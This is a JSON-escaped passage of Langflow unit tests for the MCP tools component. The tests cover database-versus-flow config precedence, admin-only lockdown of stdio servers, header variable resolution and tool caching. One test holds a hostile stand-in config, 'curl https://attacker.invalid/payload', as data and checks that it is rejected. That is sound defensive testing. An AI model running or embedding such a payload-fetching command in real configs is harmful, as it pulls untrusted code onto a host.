patch(\\\"langflow.api.v2.mcp.get_server\\\") as mock_get_server,\\n            patch(\\\"langflow.services.database.models.user.crud.get_user_by_id\\\") as mock_get_user,\\n            patch(\\\"lfx.components.models_and_agents.mcp_component.session_scope\\\"),\\n            patch.object(component.stdio_client, \\\"connect_to_server\\\") as mock_connect,\\n        ):\\n            mock_get_user.return_value = MagicMock(id=\\\"test_user_123\\\")\\n            mock_get_server.return_value = db_config\\n            mock_connect.return_value = []\\n\\n            # Call update_tool_list which should fetch from database\\n            await component.update_tool_list()\\n\\n            # Verify that get_server WAS called since no value config provided\\n            mock_get_server.assert_called_once()\\n\\n            # Verify connect_to_server was called\\n            mock_connect.assert_called_once()\\n\\n    @pytest.mark.asyncio\\n    async def test_value_config_used_as_fallback_when_not_in_database(self, component):\\n        \\\"\\\"\\\"Test that value config is used as fallback when server not in database.\\\"\\\"\\\"\\n        # Set up component with server name and config in value\\n        value_config = {\\n            \\\"command\\\": \\\"uvx\\\",\\n            \\\"args\\\": [\\\"mcp-server-from-value\\\", \\\"--test\\\"],\\n        }\\n        component.mcp_server = {\\\"name\\\": \\\"new_server\\\", \\\"config\\\": value_config}\\n        component._user_id = \\\"test_user_123\\\"\\n\\n        with (\\n            patch(\\\"langflow.api.v2.mcp.get_server\\\") as mock_get_server,\\n            patch(\\\"langflow.services.database.models.user.crud.get_user_by_id\\\") as mock_get_user,\\n            patch(\\\"lfx.components.models_and_agents.mcp_component.session_scope\\\"),\\n            patch.object(component.stdio_client, \\\"connect_to_server\\\") as mock_connect,\\n        ):\\n            mock_get_user.return_value = MagicMock(id=\\\"test_user_123\\\")\\n            # Database returns None (server not found)\\n            mock_get_server.return_value = None\\n            mock_connect.return_value = []\\n\\n            # Call update_tool_list which should fall back to value config\\n            await component.update_tool_list()\\n\\n            # Verify that get_server WAS called to check database first\\n            mock_get_server.assert_called_once()\\n\\n            # Connect should be called with value config as fallback\\n            mock_connect.assert_called_once()\\n\\n    @pytest.mark.asyncio\\n    async def test_missing_named_server_fails_with_actionable_error(self, component):\\n        \\\"\\\"\\\"A portable flow must identify the server registration required on the target.\\\"\\\"\\\"\\n        component.mcp_server = {\\\"name\\\": \\\"production_server\\\"}\\n        component._user_id = \\\"test_user_123\\\"\\n\\n        with (\\n            patch(\\\"langflow.api.v2.mcp.get_server\\\") as mock_get_server,\\n            patch(\\\"langflow.services.database.models.user.crud.get_user_by_id\\\") as mock_get_user,\\n            patch(\\\"lfx.components.models_and_agents.mcp_component.session_scope\\\"),\\n            patch(\\\"lfx.components.models_and_agents.mcp_component.update_tools\\\") as mock_update_tools,\\n        ):\\n            mock_get_user.return_value = MagicMock(id=\\\"test_user_123\\\")\\n            mock_get_server.return_value = None\\n\\n            with pytest.raises(\\n                ValueError,\\n                match=re.escape(\\n                    \\\"MCP server 'production_server' is not configured. \\\"\\n                    \\\"Add a server with this name in Settings > MCP Servers before running this flow.\\\"\\n                ),\\n            ):\\n                await component.update_tool_list()\\n\\n            mock_update_tools.assert_not_called()\\n\\n    @pytest.mark.asyncio\\n    async def test_value_config_respects_code_execution_lockdown(self, component, monkeypatch):\\n        \\\"\\\"\\\"An imported stdio config cannot bypass the non-admin process policy.\\\"\\\"\\\"\\n        component.mcp_server = {\\n            \\\"name\\\": \\\"embedded_stdio\\\",\\n            \\\"config\\\": {\\\"command\\\": \\\"uvx\\\", \\\"args\\\": [\\\"mcp-server-fetch\\\"]},\\n        }\\n        component._user_id = \\\"test_user_123\\\"\\n        settings = get_settings_service().settings\\n        monkeypatch.setattr(settings, \\\"allow_custom_components\\\", True)\\n        monkeypatch.setattr(settings, \\\"custom_component_admin_only\\\", True)\\n        monkeypatch.setattr(settings, \\\"block_code_interpreter_components\\\", False)\\n\\n        with (\\n            patch(\\\"langflow.api.v2.mcp.get_server\\\") as mock_get_server,\\n            patch(\\\"langflow.services.database.models.user.crud.get_user_by_id\\\") as mock_get_user,\\n            patch(\\\"lfx.components.models_and_agents.mcp_component.session_scope\\\"),\\n            patch.object(component.stdio_client, \\\"connect_to_server\\\") as mock_connect,\\n        ):\\n            mock_get_user.return_value = SimpleNamespace(id=\\\"test_user_123\\\", is_superuser=False)\\n            mock_get_server.return_value = None\\n\\n            with pytest.raises(ValueError, match=\\\"restricted to administrators\\\"):\\n                await component.update_tool_list()\\n\\n            mock_connect.assert_not_called()\\n\\n    @pytest.mark.asyncio\\n    async def test_cached_stdio_config_rechecks_code_execution_lockdown(self, component, monkeypatch):\\n        \\\"\\\"\\\"A cached stdio tool list must not outlive a newly enabled lockdown.\\\"\\\"\\\"\\n        server_name = \\\"embedded_stdio\\\"\\n        server_config = {\\\"command\\\": \\\"uvx\\\", \\\"args\\\": [\\\"mcp-server-fetch\\\"]}\\n        cached_tool = SimpleNamespace(name=\\\"cached-tool\\\")\\n        component.mcp_server = {\\\"name\\\": server_name, \\\"config\\\": server_config}\\n        component._user_id = \\\"test_user_123\\\"\\n        component.use_cache = True\\n\\n        cache_key = component._mcp_servers_cache_key(server_name)\\n        servers_cache = {\\n            cache_key: {\\n                \\\"tools\\\": [cached_tool],\\n                \\\"tool_cache\\\": {\\\"cached-tool\\\": cached_tool},\\n                \\\"config\\\": server_config,\\n            }\\n        }\\n        monkeypatch.setattr(\\n            \\\"lfx.components.models_and_agents.mcp_component.safe_cache_get\\\",\\n            lambda _cache, key, default=None: servers_cache if key == \\\"servers\\\" else default,\\n        )\\n\\n        settings = get_settings_service().settings\\n        monkeypatch.setattr(settings, \\\"allow_custom_components\\\", True)\\n        monkeypatch.setattr(settings, \\\"custom_component_admin_only\\\", True)\\n        monkeypatch.setattr(settings, \\\"block_code_interpreter_components\\\", False)\\n\\n        with (\\n            patch(\\\"langflow.api.v2.mcp.get_server\\\") as mock_get_server,\\n            patch(\\\"langflow.services.database.models.user.crud.get_user_by_id\\\") as mock_get_user,\\n            patch(\\\"lfx.components.models_and_agents.mcp_component.session_scope\\\"),\\n            patch.object(component.stdio_client, \\\"connect_to_server\\\") as mock_connect,\\n        ):\\n            mock_get_user.return_value = SimpleNamespace(id=\\\"test_user_123\\\", is_superuser=False)\\n\\n            with pytest.raises(ValueError, match=\\\"restricted to administrators\\\"):\\n                await component.update_tool_list()\\n\\n            mock_get_server.assert_not_called()\\n            mock_connect.assert_not_called()\\n\\n    @pytest.mark.asyncio\\n    async def test_unsafe_value_config_is_rejected_when_not_in_database(self, component):\\n        \\\"\\\"\\\"An embedded fallback must be rejected before the stdio client is used.\\\"\\\"\\\"\\n        component.mcp_server = {\\n            \\\"name\\\": \\\"unsafe_server\\\",\\n            \\\"config\\\": {\\\"command\\\": \\\"curl\\\", \\\"args\\\": [\\\"https://attacker.invalid/payload\\\"]},\\n        }\\n        component._user_id = \\\"test_user_123\\\"\\n\\n        with (\\n            patch(\\\"langflow.api.v2.mcp.get_server\\\") as mock_get_server,\\n            patch(\\\"langflow.services.database.models.user.crud.get_user_by_id\\\") as mock_get_user,\\n            patch(\\\"lfx.components.models_and_agents.mcp_component.session_scope\\\"),\\n            patch.object(component.stdio_client, \\\"connect_to_server\\\") as mock_connect,\\n        ):\\n            mock_get_user.return_value = MagicMock(id=\\\"test_user_123\\\")\\n            mock_get_server.return_value = None\\n\\n            with pytest.raises(ValueError, match=\\\"Command 'curl' is not allowed\\\"):\\n                await component.update_tool_list()\\n\\n            mock_connect.assert_not_called()\\n\\n    @pytest.mark.asyncio\\n    async def test_rest_api_new_server_scenario(self, component):\\n        \\\"\\\"\\\"Test REST API scenario where tweaks provide config for a new server not in database.\\\"\\\"\\\"\\n        # Simulate REST API call with tweaks providing full config for a new server\\n        api_provided_config = {\\n            \\\"command\\\": \\\"uvx\\\",\\n            \\\"args\\\": [\\\"mcp-server-api-new\\\", \\\"--api-mode\\\"],\\n            \\\"env\\\": {\\\"API_KEY\\\": \\\"secret123\\\"},  # pragma: allowlist secret\\n        }\\n        component.mcp_server = {\\\"name\\\": \\\"new_api_server\\\", \\\"config\\\": api_provided_config}\\n        component._user_id = \\\"api_user_456\\\"\\n\\n        with (\\n            patch(\\\"langflow.api.v2.mcp.get_server\\\") as mock_get_server,\\n            patch(\\\"langflow.services.database.models.user.crud.get_user_by_id\\\") as mock_get_user,\\n            patch(\\\"lfx.components.models_and_agents.mcp_component.session_scope\\\"),\\n            patch.object(component.stdio_client, \\\"connect_to_server\\\") as mock_connect,\\n        ):\\n            mock_get_user.return_value = MagicMock(id=\\\"api_user_456\\\")\\n            # Database returns None (server not in database yet)\\n            mock_get_server.return_value = None\\n            mock_connect.return_value = []\\n\\n            # Call update_tool_list\\n            await component.update_tool_list()\\n\\n            # Database should be queried first\\n            mock_get_server.assert_called_once()\\n\\n            # Connect should be called with API-provided config as fallback\\n\\n    # Tests below patch `builtins.__import__` to simulate import failures. This is a\\n    # heavyweight approach \u2014 the patch intercepts *every* import executed while active,\\n    # including unrelated library code pulled in by awaits, mocks, or assertions \u2014 but\\n    # targeted alternatives (sys.modules / importlib) do not reliably reproduce the\\n    # `ModuleNotFoundError` raised from an `import langflow.*` statement inside the\\n    # code under test. The `real_import` fallback forwards all non-matching names to\\n    # the real import machinery; the `name`-prefix guard in each fake_import is kept\\n    # as tight as possible so surrounding test plumbing is not affected.\\n\\n    @pytest.mark.asyncio\\n    async def test_update_tool_list_falls_back_to_value_config_when_langflow_absent(self, component):\\n        \\\"\\\"\\\"Test LFX standalone mode falls back to value config when Langflow is unavailable.\\n\\n        Regression test: when lfx is run without the full Langflow package installed\\n        (e.g., serving a flow via `lfx`), importing `langflow.api.v2.mcp` raises\\n        ModuleNotFoundError. The component must gracefully fall back to the server\\n        config embedded in the flow JSON (server_config_from_value) rather than failing.\\n        \\\"\\\"\\\"\\n        import builtins\\n\\n        value_config = {\\n            \\\"command\\\": \\\"uvx\\\",\\n            \\\"args\\\": [\\\"mcp-server-from-value\\\", \\\"--standalone\\\"],\\n        }\\n        component.mcp_server = {\\\"name\\\": \\\"standalone_server\\\", \\\"config\\\": value_config}\\n        component._user_id = \\\"test_user_123\\\"\\n\\n        real_import = builtins.__import__\\n        langflow_prefixes = (\\\"langflow.api.v2.mcp\\\", \\\"langflow.services.database\\\")\\n\\n        def fake_import(name, import_globals=None, import_locals=None, fromlist=(), level=0):\\n            if any(name == p or name.startswith(p + \\\".\\\") for p in langflow_prefixes):\\n                raise ModuleNotFoundError(name=name)\\n            return real_import(name, import_globals, import_locals, fromlist, level)\\n\\n        with (\\n            patch(\\\"builtins.__import__\\\", side_effect=fake_import),\\n            patch(\\\"lfx.components.models_and_agents.mcp_component.update_tools\\\") as mock_update_tools,\\n        ):\\n            mock_update_tools.return_value = (None, [], {})\\n\\n            # Must not raise \u2014 should fall back to value config\\n            _tools, server_info = await component.update_tool_list()\\n\\n            # update_tools should have been called with the value config as a fallback\\n            mock_update_tools.assert_called_once()\\n            call_kwargs = mock_update_tools.call_args.kwargs\\n            assert call_kwargs[\\\"server_name\\\"] == \\\"standalone_server\\\"\\n            assert call_kwargs[\\\"server_config\\\"][\\\"command\\\"] == \\\"uvx\\\"\\n            assert call_kwargs[\\\"server_config\\\"][\\\"args\\\"] == [\\\"mcp-server-from-value\\\", \\\"--standalone\\\"]\\n\\n            # server_info should echo the resolved value config\\n            assert server_info[\\\"name\\\"] == \\\"standalone_server\\\"\\n            assert server_info[\\\"config\\\"][\\\"command\\\"] == \\\"uvx\\\"\\n\\n    @pytest.mark.asyncio\\n    async def test_update_tool_list_surfaces_transitive_import_error_instead_of_falling_back(self, component):\\n        \\\"\\\"\\\"A transitive ModuleNotFoundError inside Langflow must NOT be silently swallowed.\\n\\n        If a Langflow dependency (e.g. sqlmodel) fails to import while loading\\n        langflow.services.database.models.user.crud, that's a real bug in the full\\n        Langflow stack \u2014 not LFX standalone mode. We must not silently fall back\\n        to the flow-embedded config, because the database config is supposed to\\n        take precedence when Langflow is available.\\n        \\\"\\\"\\\"\\n        import builtins\\n\\n        component.mcp_server = {\\n            \\\"name\\\": \\\"broken_server\\\",\\n            \\\"config\\\": {\\\"command\\\": \\\"uvx\\\", \\\"args\\\": [\\\"mcp-server-from-value\\\"]},\\n        }\\n        component._user_id = \\\"test_user_123\\\"\\n\\n        real_import = builtins.__import__\\n\\n        transitive_error_msg = \\\"No module named 'sqlmodel'\\\"\\n\\n        def fake_import(name, import_globals=None, import_locals=None, fromlist=(), level=0):\\n            # Simulate a transitive dependency failure: sqlmodel is the missing module,\\n            # not a Langflow module. This should NOT be treated as standalone mode.\\n            if name.startswith(\\\"langflow.services.database\\\"):\\n                raise ModuleNotFoundError(transitive_error_msg, name=\\\"sqlmodel\\\")\\n            return real_import(name, import_globals, import_locals, fromlist, level)\\n\\n        with (\\n            patch(\\\"builtins.__import__\\\", side_effect=fake_import),\\n            patch(\\\"lfx.components.models_and_agents.mcp_component.update_tools\\\") as mock_update_tools,\\n        ):\\n            mock_update_tools.return_value = (None, [], {})\\n\\n            # The transitive ImportError must surface (wrapped as ValueError by the\\n            # outer handler in update_tool_list); update_tools must NOT be called.\\n            with pytest.raises(ValueError, match=\\\"Error updating tool list\\\") as exc_info:\\n                await component.update_tool_list()\\n\\n            # The original ModuleNotFoundError for sqlmodel should be preserved as __cause__\\n            assert isinstance(exc_info.value.__cause__, ModuleNotFoundError)\\n            assert exc_info.value.__cause__.name == \\\"sqlmodel\\\"\\n\\n            mock_update_tools.assert_not_called()\\n\\n    @pytest.mark.asyncio\\n    async def test_update_tool_list_surfaces_plain_import_error_instead_of_falling_back(self, component):\\n        \\\"\\\"\\\"A plain ImportError (attribute missing, not module missing) must surface.\\n\\n        Regression test for the intentional `except ModuleNotFoundError` narrowing: if\\n        an installed Langflow no longer exposes `get_server` or `get_user_by_id` (real\\n        API break), the resulting ImportError \u2014 which is NOT a ModuleNotFoundError \u2014\\n        must NOT be swallowed as standalone mode. It must propagate to the outer\\n        handler and surface as a `ValueError(\\\"Error updating tool list: ...\\\")`.\\n        \\\"\\\"\\\"\\n        import builtins\\n\\n        component.mcp_server = {\\n            \\\"name\\\": \\\"broken_server\\\",\\n            \\\"config\\\": {\\\"command\\\": \\\"uvx\\\", \\\"args\\\": [\\\"mcp-server-from-value\\\"]},\\n        }\\n        component._user_id = \\\"test_user_123\\\"\\n\\n        real_import = builtins.__import__\\n\\n        def fake_import(name, import_globals=None, import_locals=None, fromlist=(), level=0):\\n            # The module imports fine, but a specific attribute is missing \u2014 this\\n            # raises plain ImportError (not ModuleNotFoundError) at the `from ... import`\\n            # line. Emulate that by raising ImportError when this module is requested\\n            # with a fromlist, just as `from langflow.api.v2.mcp import get_server` would.\\n            if name == \\\"langflow.api.v2.mcp\\\" and fromlist and \\\"get_server\\\" in fromlist:\\n                msg = \\\"cannot import name 'get_server' from 'langflow.api.v2.mcp'\\\"\\n                raise ImportError(msg, name=\\\"langflow.api.v2.mcp\\\")\\n            return real_import(name, import_globals, import_locals, fromlist, level)\\n\\n        with (\\n            patch(\\\"builtins.__import__\\\", side_effect=fake_import),\\n            patch(\\\"lfx.components.models_and_agents.mcp_component.update_tools\\\") as mock_update_tools,\\n        ):\\n            mock_update_tools.return_value = (None, [], {})\\n\\n            with pytest.raises(ValueError, match=\\\"Error updating tool list\\\") as exc_info:\\n                await component.update_tool_list()\\n\\n            # The original ImportError should be preserved as __cause__ \u2014 it must not\\n            # have been silently converted into a fallback path.\\n            assert isinstance(exc_info.value.__cause__, ImportError)\\n            assert not isinstance(exc_info.value.__cause__, ModuleNotFoundError)\\n\\n            mock_update_tools.assert_not_called()\\n\\n    @pytest.mark.asyncio\\n    async def test_update_tool_list_surfaces_lfx_services_deps_missing(self, component):\\n        \\\"\\\"\\\"A ModuleNotFoundError for an lfx module (not langflow.*) must surface.\\n\\n        Edge-case regression test: if `lfx.services.deps` itself is missing (a\\n        packaging error inside lfx), the prefix check `missing_module == \\\"langflow\\\"\\n        or missing_module.startswith(\\\"langflow.\\\")` correctly returns False and the\\n        error is re-raised. Locks in the intended precedence rule so a future rewrite\\n        of the prefix check cannot silently convert this into a standalone fallback.\\n        \\\"\\\"\\\"\\n        import builtins\\n\\n        component.mcp_server = {\\n            \\\"name\\\": \\\"broken_server\\\",\\n            \\\"config\\\": {\\\"command\\\": \\\"uvx\\\", \\\"args\\\": [\\\"mcp-server-from-value\\\"]},\\n        }\\n        component._user_id = \\\"test_user_123\\\"\\n\\n        real_import = builtins.__import__\\n\\n        deps_missing_msg = \\\"No module named 'lfx.services.deps'\\\"\\n\\n        def fake_import(name, import_globals=None, import_locals=None, fromlist=(), level=0):\\n            if name == \\\"lfx.services.deps\\\" or name.startswith(\\\"lfx.services.deps.\\\"):\\n                raise ModuleNotFoundError(deps_missing_msg, name=\\\"lfx.services.deps\\\")\\n            return real_import(name, import_globals, import_locals, fromlist, level)\\n\\n        with (\\n            patch(\\\"builtins.__import__\\\", side_effect=fake_import),\\n            patch(\\\"lfx.components.models_and_agents.mcp_component.update_tools\\\") as mock_update_tools,\\n        ):\\n            mock_update_tools.return_value = (None, [], {})\\n\\n            with pytest.raises(ValueError, match=\\\"Error updating tool list\\\") as exc_info:\\n                await component.update_tool_list()\\n\\n            assert isinstance(exc_info.value.__cause__, ModuleNotFoundError)\\n            assert exc_info.value.__cause__.name == \\\"lfx.services.deps\\\"\\n\\n            mock_update_tools.assert_not_called()\\n\\n\\nclass TestMCPComponentGlobalVariableResolution:\\n    \\\"\\\"\\\"Header global variables must resolve even when a request overrides some of them.\\n\\n    Regression coverage for #14602: loading global variables from the database was\\n    skipped whenever the request carried any override, so a header bound to a\\n    non-overridden variable was sent upstream with the literal variable name as its\\n    value instead of the stored secret.\\n    \\\"\\\"\\\"\\n\\n    USER_ID = \\\"11111111-1111-1111-1111-111111111111\\\"\\n    SERVER_CONFIG = {\\n        \\\"url\\\": \\\"https://echo.invalid/mcp\\\",\\n        \\\"headers\\\": {\\\"X-Auth1\\\": \\\"AUTH-VAR1\\\", \\\"X-Auth2\\\": \\\"AUTH-VAR2\\\"},\\n    }\\n    DB_VARIABLES = {\\\"AUTH-VAR1\\\": \\\"var1-placeholder\\\", \\\"AUTH-VAR2\\\": \\\"my-api-key\\\"}\\n\\n    async def _run(self, context_variables, server_config=None):\\n        \\\"\\\"\\\"Drive update_tool_list and return (request_variables passed on, variable_service).\\\"\\\"\\\"\\n        component = MCPToolsComponent()\\n        component.mcp_server = \\\"test_server\\\"\\n        component._user_id = self.USER_ID\\n        if context_variables is not None:\\n            # ``graph`` is a read-only property backed by ``_vertex.graph``.\\n            component._vertex = SimpleNamespace(graph=SimpleNamespace(context={\\\"request_variables\\\": context_variables}))\\n\\n        variable_service = MagicMock()\\n        variable_service.get_all_decrypted_variables = AsyncMock(return_value=dict(self.DB_VARIABLES))\\n\\n        with (\\n            patch(\\n                \\\"langflow.api.v2.mcp.get_server\\\",\\n                new=AsyncMock(return_value=dict(server_config if server_config is not None else self.SERVER_CONFIG)),\\n            ),\\n            patch(\\n                \\\"langflow.services.database.models.user.crud.get_user_by_id\\\",\\n                new=AsyncMock(return_value=MagicMock(id=self.USER_ID)),\\n            ),\\n            patch(\\\"lfx.components.models_and_agents.mcp_component.session_scope\\\"),\\n            patch(\\\"lfx.services.deps.get_variable_service\\\", return_value=variable_service),\\n            patch(\\n                \\\"lfx.components.models_and_agents.mcp_component.update_tools\\\",\\n                new=AsyncMock(return_value=(\\\"Streamable_HTTP\\\", [], {})),\\n            ) as mock_update_tools,\\n        ):\\n            await component.update_tool_list()\\n\\n        return mock_update_tools.call_args.kwargs[\\\"request_variables\\\"], variable_service\\n\\n    @pytest.mark.asyncio\\n    async def test_database_variables_loaded_without_request_override(self):\\n        \\\"\\\"\\\"Baseline: with no per-request override every global variable is loaded.\\\"\\\"\\\"\\n        resolved, _ = await self._run(None)\\n\\n        assert resolved == self.DB_VARIABLES\\n\\n    @pytest.mark.asyncio\\n    async def test_request_override_merges_with_database_variables(self):\\n        \\\"\\\"\\\"A partial override must not suppress the database load for other variables.\\\"\\\"\\\"\\n        resolved, _ = await self._run({\\\"AUTH-VAR1\\\": \\\"my-session-api-key\\\"})\\n\\n        assert resolved == {\\\"AUTH-VAR1\\\": \\\"my-session-api-key\\\", \\\"AUTH-VAR2\\\": \\\"my-api-key\\\"}\\n\\n    @pytest.mark.asyncio\\n    async def test_non_overridden_header_resolves_to_stored_value(self):\\n        \\\"\\\"\\\"The variable name must never reach the upstream server as a header value.\\\"\\\"\\\"\\n        from lfx.base.mcp.util import _process_headers\\n\\n        resolved, _ = await self._run({\\\"AUTH-VAR1\\\": \\\"my-session-api-key\\\"})\\n        headers = _process_headers(dict(self.SERVER_CONFIG[\\\"headers\\\"]), resolved)\\n\\n        assert headers == {\\\"x-auth1\\\": \\\"my-session-api-key\\\", \\\"x-auth2\\\": \\\"my-api-key\\\"}\\n\\n    @pytest.mark.asyncio\\n    async def test_no_database_query_when_config_has_no_headers(self):\\n        \\\"\\\"\\\"The load stays skipped for header-less servers, preserving the fast path.\\\"\\\"\\\"\\n        _, variable_service = await self._run(None, server_config={\\\"url\\\": \\\"https://echo.invalid/mcp\\\"})\\n\\n        variable_service.get_all_decrypted_variables.assert_not_called()\\n\\n\\n# ============================================================================\\n# Tests for resolve_mcp_config pure function\\n# ============================================================================\\n\\n\\ndef test_resolve_config_db_takes_priority():\\n    \\\"\\\"\\\"Test that database config takes priority over value config.\\\"\\\"\\\"\\n    from lfx.components.models_and_agents.mcp_component import resolve_mcp_config\\n\\n    db_config = {\\\"command\\\": \\\"uvx\\\", \\\"args\\\": [\\\"from-db\\\", \\\"--prod\\\"]}\\n    value_config = {\\\"command\\\": \\\"uvx\\\", \\\"args\\\": [\\\"from-value\\\", \\\"--test\\\"]}\\n\\n    result = resolve_mcp_config(\\\"test_server\\\", value_config, db_config)\\n\\n    assert result == db_config\\n\\n\\ndef test_resolve_config_falls_back_to_value():\\n    \\\"\\\"\\\"Test that value config is used when DB returns None.\\\"\\\"\\\"\\n    from lfx.components.models_and_agents.mcp_component import resolve_mcp_config\\n\\n    value_config = {\\\"command\\\": \\\"uvx\\\", \\\"args\\\": [\\\"from-value\\\", \\\"--test\\\"]}\\n\\n    result = resolve_mcp_config(\\\"test_server\\\", value_config, None)\\n\\n    assert result == value_config\\n\\n\\ndef test_resolve_config_both_none():\\n    \\\"\\\"\\\"Test behavior when both configs are None.\\\"\\\"\\\"\\n    from lfx.components.models_and_agents.mcp_component import resolve_mcp_config\\n\\n    assert resolve_mcp_config(\\\"test_server\\\", None, None) is None\\n\\n\\n# ============================================================================\\n# Additional fixture-based tests as recommended in code review\\n# ============================================================================\\n\\n\\n@pytest.fixture\\ndef mock_db_session_with_servers():\\n    \\\"\\\"\\\"Create a simple mock session that doesn't require session_scope.\\\"\\\"\\\"\\n\\n    class MockSession:\\n        def __init__(self):\\n            self.servers = {\\n                \\\"test_server\\\": {\\\"command\\\": \\\"uvx\\\", \\\"args\\\": [\\\"test\\\"]},\\n                \\\"prod_server\\\": {\\\"command\\\": \\\"uvx\\\", \\\"args\\\": [\\\"prod\\\", \\\"--prod\\\"]},\\n            }\\n\\n        async def __aenter__(self):\\n            return self\\n\\n        async def __aexit__(self, exc_type, exc_val, exc_tb):\\n            pass\\n\\n        async def get_server(self, name):\\n            return self.servers.get(name)\\n\\n    return MockSession()\\n\\n\\n@pytest.mark.asyncio\\nasync def test_config_priority_with_fixtures(mock_db_session_with_servers):\\n    \\\"\\\"\\\"Test using fixtures with real data instead of heavy mocking.\\\"\\\"\\\"\\n    from lfx.components.models_and_agents.mcp_component import MCPToolsComponent\\n\\n    component = MCPToolsComponent()\\n    component.mcp_server = {\\\"name\\\": \\\"test_server\\\", \\\"config\\\": {\\\"command\\\": \\\"from-value\\\"}}\\n    component._user_id = \\\"test_user\\\"\\n\\n    # Inject the mock session directly rather than mocking session_scope\\n    with (\\n        patch(\\\"langflow.api.v2.mcp.get_server\\\") as mock_get_server,\\n        patch(\\\"langflow.services.database.models.user.crud.get_user_by_id\\\") as mock_get_user,\\n        patch(\\n            \\\"lfx.components.models_and_agents.mcp_component.session_scope\\\",\\n            return_value=mock_db_session_with_servers,\\n        ),\\n        patch.object(component.stdio_client, \\\"connect_to_server\\\", return_value=[]),\\n    ):\\n        mock_get_user.return_value = MagicMock(id=\\\"test_user\\\")\\n        mock_get_server.return_value = {\\\"command\\\": \\\"uvx\\\", \\\"args\\\": [\\\"test\\\"]}\\n\\n        _tools, server_info = await component.update_tool_list()\\n\\n    # Verify behavior without needing to assert on mocks\\n    assert server_info[\\\"config\\\"][\\\"command\\\"] == \\\"uvx\\\"  # From DB\\n    assert server_info[\\\"config\\\"][\\\"args\\\"] == [\\\"test\\\"]\\n\"},{\"record_type\":\"third_party_source_reference\",\"source_repository\":\"langflow-main\",\"source_path\":\"src/backend/tests/unit/components/models_and_agents/test_mcp_component_cache.py\",\"source_license\":\"MIT\",\"trust\":\"untrusted_reference_only\",\"retrieval_policy\":\"internal_reference_only\",\"source_sha256\":\"dbe06b0177ff11d5a9518608d2537864ed2423163d8425c80f2f28db18cc3cc1\",\"content\":\"\\\"\\\"\\\"Unit tests for MCP component cache functionality.\\n\\nThis test suite validates the caching behavior of the MCP component:\\n- Cache enabled: tools are cached and reused for performance\\n- Cache disabled: tools are fetched fresh every time\\n- Cache toggle: switching between enabled/disabled states\\n- Edge cases: empty cache, invalid servers, error handling\\n\\\"\\\"\\\"\\n\\nfrom typing import Any\\nfrom unittest.mock import AsyncMock, MagicMock, patch\\nfrom uuid import uuid4\\n\\nimport pytest\\nfrom lfx.base.agents.utils import safe_cache_get, safe_cache_set\\nfrom lfx.components.models_and_agents.mcp_component import MCPToolsComponent\\nfrom lfx.schema.dataframe import DataFrame\\n\\nfrom tests.base import ComponentTestBaseWithoutClient\\n\\n\\nclass TestMCPComponentCache(ComponentTestBaseWithoutClient):\\n    @pytest.fixture\\n    def component_class(self):\\n        return MCPToolsComponent\\n\\n    @pytest.fixture\\n    def file_names_mapping(self):\\n        return []\\n\\n    @pytest.fixture\\n    def default_kwargs(self):\\n        \\\"\\\"\\\"Return the default kwargs for the component.\\\"\\\"\\\"\\n        return {\\n            \\\"mcp_server\\\": {\\n                \\\"name\\\": \\\"test_server\\\",\\n                \\\"config\\\": {\\\"command\\\": \\\"uvx\\\", \\\"args\\\": [\\\"test-mcp-server\\\"]},\\n            },\\n            \\\"tool\\\": \\\"\\\",\\n            \\\"use_cache\\\": False,\\n        }\\n\\n    @pytest.fixture\\n    def mock_tool(self):\\n        \\\"\\\"\\\"Create a mock tool for testing.\\\"\\\"\\\"\\n        tool = MagicMock()\\n        tool.name = \\\"test_tool\\\"\\n        tool.args_schema.schema.return_value = {\\n            \\\"type\\\": \\\"object\\\",\\n            \\\"properties\\\": {\\\"message\\\": {\\\"type\\\": \\\"string\\\", \\\"description\\\": \\\"Message to echo\\\"}},\\n        }\\n        return tool\\n\\n    @pytest.fixture\\n    def mock_tools_list(self, mock_tool):\\n        \\\"\\\"\\\"Create a list of mock tools.\\\"\\\"\\\"\\n        tool2 = MagicMock()\\n        tool2.name = \\\"second_tool\\\"\\n        tool2.args_schema.schema.return_value = {\\n            \\\"type\\\": \\\"object\\\",\\n            \\\"properties\\\": {\\\"param\\\": {\\\"type\\\": \\\"string\\\", \\\"description\\\": \\\"Test parameter\\\"}},\\n        }\\n        return [mock_tool, tool2]\\n\\n    @pytest.fixture\\n    def mock_server_config(self):\\n        \\\"\\\"\\\"Mock server configuration.\\\"\\\"\\\"\\n        return {\\\"command\\\": \\\"uvx\\\", \\\"args\\\": [\\\"test-mcp-server\\\"], \\\"env\\\": {}}\\n\\n    async def component_setup(self, component_class: type[Any], default_kwargs: dict[str, Any]) -> MCPToolsComponent:\\n        component_instance = await super().component_setup(component_class, default_kwargs)\\n        component_instance._user_id = str(uuid4())  # Required for server fetching\\n        return component_instance\\n\\n    # ========================================\\n    # Cache Enabled Tests\\n    # ========================================\\n\\n    @pytest.mark.asyncio\\n    async def test_cache_enabled_by_default(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test that cache is enabled by default.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n        assert getattr(component, \\\"use_cache\\\", False) is False  # Updated to match actual default\\n\\n    @pytest.mark.asyncio\\n    async def test_cache_stores_tools_when_enabled(\\n        self, component_class, default_kwargs, mock_tools_list, mock_server_config\\n    ):\\n        \\\"\\\"\\\"Test that tools are cached when cache is enabled.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.use_cache = True\\n        server_name = \\\"test_server\\\"\\n        cache_key = component._mcp_servers_cache_key(server_name)\\n\\n        # Directly test caching by setting up expected data and calling the method\\n        # Simulate successful tool fetching by manually populating the result\\n        component.tools = mock_tools_list\\n        component.tool_names = [\\\"test_tool\\\", \\\"second_tool\\\"]\\n        component._tool_cache = {\\\"test_tool\\\": mock_tools_list[0]}\\n\\n        # Manually populate cache as if tools were fetched\\n        cache_data = {\\n            \\\"tools\\\": mock_tools_list,\\n            \\\"tool_names\\\": [\\\"test_tool\\\", \\\"second_tool\\\"],\\n            \\\"tool_cache\\\": {\\\"test_tool\\\": mock_tools_list[0]},\\n            \\\"config\\\": mock_server_config,\\n        }\\n        current_servers_cache = safe_cache_get(component._shared_component_cache, \\\"servers\\\", {})\\n        current_servers_cache[cache_key] = cache_data\\n        safe_cache_set(component._shared_component_cache, \\\"servers\\\", current_servers_cache)\\n\\n        # Now call update_tool_list which should use the cache\\n        tools, server_info = await component.update_tool_list(server_name)\\n\\n        # Verify tools were returned from cache\\n        assert len(tools) == 2\\n        assert tools[0].name == \\\"test_tool\\\"\\n        assert tools[1].name == \\\"second_tool\\\"\\n        assert server_info[\\\"name\\\"] == server_name\\n\\n        # Verify tools are still 